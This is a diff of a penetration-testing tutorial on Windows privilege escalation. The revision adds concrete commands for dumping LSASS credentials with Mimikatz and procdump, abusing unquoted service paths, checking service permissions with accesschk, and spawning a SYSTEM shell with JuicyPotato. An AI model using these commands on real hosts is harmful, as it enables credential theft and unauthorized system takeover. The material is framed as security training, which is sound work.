@@ -1,103 +1,198 @@
 # Windows Privilege Escalation
 
-Learn the fundamentals of Windows privilege escalation techniques. During a penetration test, you will often have access to some Windows hosts with an **unprivileged user**. Unprivileged users have limited access, mostly confined to their own files and folders, and cannot perform administrative tasks on the host. This limits the control you have over your target.
-
-This guide covers fundamental techniques attackers can use to elevate privileges in a Windows environment. Understanding these will let you leverage any initial unprivileged foothold on a host to escalate to an administrator account where possible.
+Learn the fundamentals of Windows privilege escalation techniques with step-by-step guidance, useful commands, and tools. During penetration testing, you often start with limited access as an **unprivileged user**. This guide will teach you how to escalate privileges to gain administrative control.
 
 ***
 
 ## Introduction
 
-During a penetration test, it's common to start with limited access as an unprivileged user on a Windows machine. Such users:
+Unprivileged users on Windows hosts have limited permissions:
 
-- Only access their own files and folders  
-- Cannot execute administrative tasks  
-- Are restricted from making system-wide changes  
+- Access only their own files/folders  
+- Cannot perform administrative tasks  
+- No system-wide control  
 
-Privilege escalation techniques help you break these limitations and gain administrative control.
-
-***
-
-## Core Windows Privilege Escalation Techniques
-
-### 1. Harvesting Passwords from Usual Spots
-
-Attackers often look for stored credentials or password remnants in places like:
-
-- **Credential Manager (Vault)**  
-- **Registry hives (e.g., SAM database)**  
-- **LSASS process memory**  
-- **Cached domain credentials**  
-- **Configuration files with embedded passwords**  
-
-Tools like Mimikatz can extract passwords, hashes, or Kerberos tickets from memory.
+Privilege escalation helps bypass these restrictions to achieve administrator or SYSTEM-level access. Start with initial foothold access, then use the techniques below to escalate.
 
 ***
 
-### 2. Abusing Service Misconfigurations
+## 1. Harvesting Passwords from Usual Spots
 
-Many Windows services run with SYSTEM or Administrator privileges. Misconfigurations can allow privilege escalation by:
+Attackers target stored credentials or sensitive data using the following methods and tools.
 
-- **Unquoted service path:** If the service executable path has spaces and is unquoted, attackers can place a malicious executable in an earlier path segment.  
-- **Insecure service permissions:** Non-admin users have modify permissions on a service and can replace its binary or change parameters.  
-- **Weak service executable files:** Executables writable by unprivileged users.  
+### A. Extracting Credentials with Mimikatz
 
-Check the service list using `sc query` and inspect configurations with tools like PowerShell or `accesschk`.
+**Mimikatz** is the most powerful tool for harvesting passwords, hashes, and Kerberos tickets.
+
+#### How to use:
+
+1. **Download Mimikatz** from a trusted source.
+2. Open a Command Prompt with **Administrator privileges** if possible (or try as unprivileged first).
+3. Run `mimikatz.exe`.
+4. In Mimikatz prompt, run:
+
+```plaintext
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+This command dumps cleartext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.
+
+#### If you do not have admin rights:
+
+- Try loading mimikatz through a process like **procdump** to dump LSASS memory.
+
+```bash
+procdump -ma lsass.exe lsass.dmp
+mimikatz.exe sekurlsa::minidump lsass.dmp
+mimikatz.exe sekurlsa::logonpasswords
+```
+
+### B. Harvesting Cached Credentials
+
+Look for cached hashes or credentials in:
+
+- `%SystemRoot%\system32\config\SAM` (requires SYSTEM/Administrator access)  
+- Credential Manager Vault via `vaultcmd.exe` or PowerShell commands  
 
 ***
 
-### 3. Abusing Dangerous Privileges
+## 2. Abusing Service Misconfigurations
 
-Some user privileges can be abused to escalate rights:
+Services with elevated privileges often have configuration issues exploitable by unprivileged users.
 
-- **SeImpersonatePrivilege:** Allows a user to impersonate other users or tokens.  
-- **SeAssignPrimaryTokenPrivilege:** Can assign tokens to processes, leading to elevated actions.  
-- **SeTakeOwnershipPrivilege:** Allows taking ownership of files and registry keys.  
-- **SeDebugPrivilege:** Lets you debug and manipulate processes running as SYSTEM or other users.  
+### A. Unquoted Service Paths
 
-Check user privileges with `whoami /priv` and leverage corresponding exploitation methods.
+If a service executable path is not enclosed in quotes and contains spaces, Windows might execute a malicious executable placed in one of the path segments.
+
+#### How to check unquoted service paths:
+
+```powershell
+Get-WmiObject win32_service | Where-Object { $_.PathName -match " " -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
+```
+
+##### Steps to exploit:
+
+1. Identify service's unquoted path, e.g., `C:\Program Files\My Service\service.exe`.
+2. Place a malicious executable named `C:\Program.exe` (or first path segment) with payload to elevate privileges.
+3. Restart the service to trigger execution of your payload as SYSTEM.
+
+### B. Insecure Service Permissions
+
+Use Sysinternals **accesschk** to check service permissions:
+
+```bash
+accesschk.exe -uwcqv "Authenticated Users" \ServiceName
+```
+
+If you have `WRITE` or `START` permissions, you can replace the service binary or change parameters.
 
 ***
 
-### 4. Abusing Vulnerable Software
+## 3. Abusing Dangerous Privileges
 
-Installed software with known vulnerabilities or running services with outdated versions can be exploited for privilege escalation:
+Users with special privileges can escalate access.
 
-- Unpatched system components  
-- Vulnerable third-party software (e.g., outdated Adobe, Java, browsers)  
-- Misconfigured or automatically running vulnerable scripts or schedulers  
+### Check your privileges:
 
-Use vulnerability scanners or manually identify the version and research publicly known exploits.
+```bash
+whoami /priv
+```
+
+### Key privileges and uses:
+
+| Privilege               | Description                      | How to exploit                       |
+|------------------------|---------------------------------|------------------------------------|
+| SeImpersonatePrivilege | Impersonate tokens                | Use **Juicy Potato** tool           |
+| SeAssignPrimaryTokenPrivilege | Assign primary tokens       | Token manipulation in scripts       |
+| SeTakeOwnershipPrivilege | Take ownership of objects       | Modify files or registry keys       |
+| SeDebugPrivilege       | Debug any process                 | Use Mimikatz or escalate processes  |
+
+### Example: Exploiting SeImpersonatePrivilege with Juicy Potato
+
+**Juicy Potato** abuses COM interfaces for privilege escalation.
+
+1. Download Juicy Potato.  
+2. Run:
+
+```bash
+JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -t * -c CLSID
+```
+
+Replace `CLSID` with a CLSID of a COM service running as SYSTEM.
+
+This spawns a SYSTEM shell.
 
 ***
 
-## Tools of the Trade
+## 4. Abusing Vulnerable Software
 
-Here are some common tools to assist with Windows privilege escalation:
+Check for outdated or vulnerable software, privilege issues arise from known exploits.
 
-| Tool           | Purpose                                  |
-|----------------|------------------------------------------|
-| **Mimikatz**   | Extract hashes, passwords, and tickets  |
-| **PowerUp**    | Automated Windows privilege escalation checks |
-| **WinPEAS**    | Enumerates possible privilege escalation vectors |
-| **accesschk**  | Checks permissions, service configurations |
-| **Sysinternals Suite** | Utilities to check system info and processes |
-| **SharpUp**    | C# tool for privilege escalation enumeration |
+### Step 1: Enumerate software
+
+```powershell
+Get-WmiObject -Class Win32_Product | Select-Object Name, Version
+```
+
+Or use **WMIC:**
+
+```bash
+wmic product get name,version
+```
+
+### Step 2: Research vulnerabilities for listed software versions.
+
+### Step 3: Exploit vulnerabilities or escalate privileges via vulnerable apps (e.g., older Adobe, Java, or custom tools).
+
+***
+
+## Tools of the Trade with Usage Examples
+
+| Tool              | Description                          | Typical Commands / Usage                                     |
+|-------------------|------------------------------------|--------------------------------------------------------------|
+| **Mimikatz**      | Extracts passwords and hashes      | `privilege::debug` / `sekurlsa::logonpasswords`             |
+| **PowerUp.ps1**   | Privilege escalation checks        | Run PowerUp script in PowerShell: `Invoke-AllChecks`         |
+| **WinPEAS.exe**   | Automated privilege escalation enumeration | Run: `.\winPEAS.exe` and review output                        |
+| **accesschk.exe** | Check permissions and ACLs          | Check service permissions: `accesschk -uwcqv "Auth Users" name`|
+| **Juicy Potato**  | Token impersonation for privilege escalation | Run with CLSID to get SYSTEM shell                             |
+| **Procdump.exe**  | Dump LSASS memory                  | `procdump -ma lsass.exe lsass.dmp`                           |
+| **SharpUp.exe**   | C# privilege escalation enumeration | Run: `SharpUp.exe`                                            |
+
+***
+
+## Step-by-Step Example: Privilege Escalation via Unquoted Service Path
+
+1. Identify services with unquoted paths:
+
+```powershell
+Get-WmiObject win32_service | Where-Object { $_.PathName -match " " -and $_.PathName -notmatch '"' } | Select-Object Name, PathName
+```
+
+2. Suppose service path is `C:\Program Files\VulnerableApp\app.exe`.
+
+3. Upload your payload as `C:\Program.exe` (the first segment without quotes).
+
+4. Restart service:
+
+```bash
+sc stop VulnerableApp
+sc start VulnerableApp
+```
+
+5. Your payload runs with SYSTEM privileges.
 
 ***
 
 ## Summary
 
-Windows privilege escalation is a vital skill during penetration testing to achieve full control over a target system. Focus on:
+| Technique                      | Tools & Commands                          | How to Use                                  |
+|------------------------------|------------------------------------------|---------------------------------------------|
+| Harvesting Passwords          | Mimikatz (`sekurlsa::logonpasswords`)    | Extract cleartext passwords and hashes     |
+| Service Misconfigurations     | PowerShell, accesschk, Juicy Potato       | Find unquoted paths, check permissions      |
+| Dangerous Privileges          | `whoami /priv`, Juicy Potato               | Exploit impersonation and debug privileges  |
+| Vulnerable Software           | PowerShell `Get-WmiObject`, CVE databases | Enumerate and exploit outdated apps         |
 
-- Harvesting credentials from memory or common storage locations  
-- Identifying and abusing service misconfigurations  
-- Leveraging dangerous privileges held by users  
-- Exploiting vulnerable installed software  
-
-Use specialized tools to automate enumeration and exploitation where possible.
-
-***  
-Keep practicing to sharpen your Windows hacking skills.
+Practice these methods carefully on lab machines to become proficient.
 
 ***
